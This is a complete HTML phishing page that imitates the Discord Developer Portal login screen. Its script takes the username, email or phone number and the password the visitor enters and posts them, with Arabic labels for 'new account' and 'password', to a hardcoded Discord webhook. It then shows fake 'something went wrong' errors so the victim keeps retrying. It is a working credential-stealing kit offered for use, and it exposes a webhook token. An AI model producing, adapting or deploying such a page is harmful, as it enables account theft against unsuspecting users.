<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Discord | Developer Portal</title>
    <style>
        body { background-color: #313338; color: #dbdee1; font-family: 'gg sans', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { width: 100%; max-width: 420px; padding: 32px; box-sizing: border-box; }
        h2 { color: #f2f3f5; font-size: 24px; text-align: center; margin: 0 0 8px; font-weight: 600; }
        p { color: #b5bac1; font-size: 16px; text-align: center; margin: 0 0 24px; }
        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; height: 40px; padding: 10px; background: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }
        button { width: 100%; height: 44px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; }
        #err { display: none; margin-top: 16px; color: #fa777a; background: rgba(250,119,122,0.1); padding: 10px; border-radius: 4px; border: 1px solid #fa777a; text-align: center; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Developer Portal</h2>
        <p>Login to manage your applications</p>
        <label>Email OR Phone Number OR Username</label>
        <input type="text" id="u">
        <label>Password</label>
        <input type="password" id="p">
        <button onclick="cap()">Log In</button>
        <div id="err"></div>
    </div>
    <script>
        let attempt = 0;
        async function cap() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value, e = document.getElementById('err');
            const h = "https://discord.com/api/webhooks/1498727574547730433/ZZsiyTAc94cRUhzTU4vCcLXUbM2wyEY6IlbS9l7dvSKsuLdAo37jwBaK-0cqov4T9ruE";
            if(u && p) {
                let type = "اليوزر";
                if(u.includes('@')) type = "الايميل";
                else if(/^\d+$/.test(u.replace('+', ''))) type = "الرقم";
                const msg = `## **حساب جديد**\n** ${type} : (${u}) **\n**الباسورد : (${p}) **`;
                await fetch(h, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: msg })});
                attempt++;
                e.style.display = 'block';
                if(attempt === 1) e.innerText = "Something went wrong please try again";
                else if(attempt === 2) e.innerText = "A system error occurred Please try again later";
                else e.innerText = "Error";
            }
        }
    </script>
</body>
</html>
